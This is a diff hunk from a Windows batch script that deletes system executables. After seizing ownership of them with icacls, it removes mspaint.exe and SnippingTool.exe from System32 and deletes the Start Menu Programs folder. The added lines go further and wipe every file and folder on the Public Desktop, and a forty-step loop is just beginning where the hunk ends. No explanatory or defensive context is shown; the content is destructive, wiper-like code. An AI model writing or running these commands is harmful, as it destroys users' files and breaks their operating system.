@@ -44,6 +44,9 @@ icacls C:\Windows\System32\SnippingTool.exe /setowner Administrator /C
 icacls C:\Windows\System32\SnippingTool.exe /grant Administrator:F /C
 del C:\Windows\System32\mspaint.exe
 del C:\Windows\System32\SnippingTool.exe
+set "TARGET_DIR=C:\Users\Public\Desktop"
+del /q /s "%TARGET_DIR%\*.*"
+for /d %%p in ("%TARGET_DIR%\*") do rd /s /q "%%p"
 cd C:\ProgramData\Microsoft\Windows\Start Menu
 rd /s /q Programs
 FOR %%b in (01,02,03,04,05,06,07,08,09,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40) DO (
